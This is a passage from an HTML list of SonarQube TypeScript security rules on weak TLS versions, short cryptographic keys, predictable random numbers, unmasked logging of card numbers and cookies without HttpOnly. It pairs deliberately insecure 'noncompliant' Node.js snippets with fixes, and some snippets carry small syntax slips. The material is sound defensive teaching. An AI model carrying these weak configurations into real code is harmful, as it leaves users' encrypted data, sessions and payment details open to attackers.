const decipheriv = crypto.createDecipheriv(algo, key, iv); // Sensitive
const pubEnc = crypto.publicEncrypt(key, buf); // Sensitive
const privDec = crypto.privateDecrypt({ key: key, passphrase: secret }, pubEnc); // Sensitive
const privEnc = crypto.privateEncrypt({ key: key, passphrase: secret }, buf); // Sensitive
const pubDec = crypto.publicDecrypt(key, privEnc); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/321">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/322">CWE-322 - Key Exchange without Entity Authentication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/323">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/324">CWE-324 - Use of a Key Past its Expiration Date</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/325">CWE-325 - Missing Required Cryptographic Step</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4423">
              typescript:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>NodeJs offers multiple ways to set weak TLS protocols. For https and tls, <a
href="https://nodejs.org/api/tls.html#tlscreatesecurecontextoptions">these options</a> are used and are used in other third-party libraries as
well.</p>
<p>The first is <code>secureProtocol</code>:</p>
<pre data-diff-id="11" data-diff-type="noncompliant">
const https = require('node:https');
const tls   = require('node:tls');

let options = {
 secureProtocol: 'TLSv1_method' // Noncompliant
};

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<p>The second is the combination of <code>minVersion</code> and <code>maxVerison</code>. Note that they cannot be specified along with the
<code>secureProtocol</code> option:</p>
<pre data-diff-id="12" data-diff-type="noncompliant">
const https = require('node:https');
const tls   = require('node:tls');

let options = {
  minVersion: 'TLSv1.1',  // Noncompliant
  maxVersion: 'TLSv1.2'
};

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<p>And <code>secureOptions</code>, which in this example instructs the OpenSSL protocol to turn off some algorithms altogether. In general, this
option might trigger side effects and should be used carefully, if used at all.</p>
<pre data-diff-id="13" data-diff-type="noncompliant">
const https     = require('node:https');
const tls       = require('node:tls');
const constants = require('node:crypto'):

let options = {
  secureOptions:
    constants.SSL_OP_NO_SSLv2
    | constants.SSL_OP_NO_SSLv3
    | constants.SSL_OP_NO_TLSv1
}; // Noncompliant

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const https = require('node:https');
const tls   = require('node:tls');

let options = {
  secureProtocol: 'TLSv1_2_method'
};

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
const https = require('node:https');
const tls   = require('node:tls');

let options = {
  minVersion: 'TLSv1.2',
  maxVersion: 'TLSv1.2'
};

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<p>Here, the goal is to turn on only TLSv1.2 and higher, by turning off all lower versions:</p>
<pre data-diff-id="13" data-diff-type="compliant">
const https = require('node:https');
const tls   = require('node:tls');

let options = {
  secureOptions:
    constants.SSL_OP_NO_SSLv2
    | constants.SSL_OP_NO_SSLv3
    | constants.SSL_OP_NO_TLSv1
    | constants.SSL_OP_NO_TLSv1_1
};

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2245">
              typescript:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>Math.random()</code> function relies on a weak pseudorandom number generator, this function should not be used for security-critical
applications or for protecting sensitive data. In such context, a cryptographically strong pseudorandom number generator (CSPRNG) should be used
instead.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a cryptographically strong pseudorandom number generator (CSPRNG) like <code>crypto.getRandomValues()</code>. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
const val = Math.random(); // Sensitive
// Check if val is used in a security context.
</pre>
<h2>Compliant Solution</h2>
<pre>
// === Client side ===
const crypto = window.crypto || window.msCrypto;
var array = new Uint32Array(1);
crypto.getRandomValues(array); // Compliant for security-sensitive use cases

// === Server side ===
const crypto = require('crypto');
const buf = crypto.randomBytes(1); // Compliant for security-sensitive use cases
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/338">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1241">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4426">
              typescript:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul>
  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>
  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul>
      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li>
    </ul>  </li>
</ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 1024,  // Noncompliant
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPairSync('dsa', {
    modulusLength: 1024,  // Noncompliant
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPair('ec', {
    namedCurve: 'secp112r2', // Noncompliant
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<h4>Compliant solution</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="compliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPairSync('dsa', {
    modulusLength: 2048,
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve
name:</p>
<pre data-diff-id="3" data-diff-type="compliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPair('ec', {
    namedCurve: 'secp224k1',
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of
<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>
<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve
parameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves
currently include:</p>
<ul>
  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>
  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>
  <li> Curve448. </li>
  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>
</ul>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
"post-quantum") counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation">Learn more here</a>.</p>
<h2>Resources</h2>
<ul>
  <li> Documentation
    <ul>
      <li> NIST Documentation - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf">NIST SP 800-186: Recommendations
      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>
      <li> IETF - <a href="https://datatracker.ietf.org/doc/html/rfc5639">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and
      Curve Generation</a> </li>
    </ul>  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5757">
              typescript:S5757
            </a>
          </td>
          <td>
            <details>
              <p>Log management is an important topic, especially for the security of a web application, to ensure user activity, including potential attackers, is
recorded and available for an analyst to understand what’s happened on the web application in case of malicious activities.</p>
<p>Retention of specific logs for a defined period of time is often necessary to comply with regulations such as GDPR, <a
href="https://www.pcisecuritystandards.org/documents/Effective-Daily-Log-Monitoring-Guidance.pdf">PCI DSS</a> and others. However, to protect user’s
privacy, certain informations are forbidden or strongly discouraged from being logged, such as user passwords or credit card numbers, which obviously
should not be stored or at least not in clear text.</p>
<h2>Ask Yourself Whether</h2>
<p>In a production environment:</p>
<ul>
  <li> The web application uses confidential information and logs a significant amount of data. </li>
  <li> Logs are externalized to SIEM or Big Data repositories. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Loggers should be configured with a list of confidential, personal information that will be hidden/masked or removed from logs.</p>
<h2>Sensitive Code Example</h2>
<p>With <a href="https://www.npmjs.com/package/signale">Signale log management framework</a> the code is sensitive when an empty list of secrets is
defined:</p>
<pre>
const { Signale } = require('signale');

const CREDIT_CARD_NUMBERS = fetchFromWebForm()
// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like ["1234-5678-0000-9999", "1234-5678-0000-8888"]; for instance

const options = {
  secrets: []         // empty list of secrets
};

const logger = new Signale(options); // Sensitive

CREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {
  logger.log('The customer ordered products with the credit card number = %s', CREDIT_CARD_NUMBER);
});
</pre>
<h2>Compliant Solution</h2>
<p>With <a href="https://www.npmjs.com/package/signale">Signale log management framework</a> it is possible to define a list of secrets that will be
hidden in logs:</p>
<pre>
const { Signale } = require('signale');

const CREDIT_CARD_NUMBERS = fetchFromWebForm()
// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like ["1234-5678-0000-9999", "1234-5678-0000-8888"]; for instance

const options = {
  secrets: ["([0-9]{4}-?)+"]
};

const logger = new Signale(options); // Compliant

CREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {
  logger.log('The customer ordered products with the credit card number = %s', CREDIT_CARD_NUMBER);
});
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/532">CWE-532 - Insertion of Sensitive Information into Log File</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S3330">
              typescript:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>
  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/cookie-session">cookie-session</a> module:</p>
<pre>
let session = cookieSession({
  httpOnly: false,// Sensitive
});  // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/express-session">express-session</a> module:</p>
<pre>
const express = require('express'),
const session = require('express-session'),

let app = express()
app.use(session({
  cookie:
  {
    httpOnly: false // Sensitive
  }
})),
</pre>
<p><a href="https://www.npmjs.com/package/cookies">cookies</a> module:</p>
<pre>
let cookies = new Cookies(req, res, { keys: keys });

cookies.set('LastVisit', new Date().toISOString(), {
  httpOnly: false // Sensitive
}); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/csurf">csurf</a> module:</p>
<pre>
const cookieParser = require('cookie-parser');
const csrf = require('csurf');
const express = require('express');

let csrfProtection = csrf({ cookie: { httpOnly: false }}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/cookie-session">cookie-session</a> module:</p>
<pre>
let session = cookieSession({
  httpOnly: true,// Compliant
});  // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/express-session">express-session</a> module:</p>
<pre>
const express = require('express');
const session = require('express-session');

let app = express();
app.use(session({
  cookie:
  {
    httpOnly: true // Compliant
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies">cookies</a> module:</p>
<pre>
let cookies = new Cookies(req, res, { keys: keys });

cookies.set('LastVisit', new Date().toISOString(), {
  httpOnly: true // Compliant
}); // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/csurf">csurf</a> module:</p>
<pre>
const cookieParser = require('cookie-parser');
const csrf = require('csurf');
const express = require('express');

let csrfProtection = csrf({ cookie: { httpOnly: true }}); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/HttpOnly">OWASP HttpOnly</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1004">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>
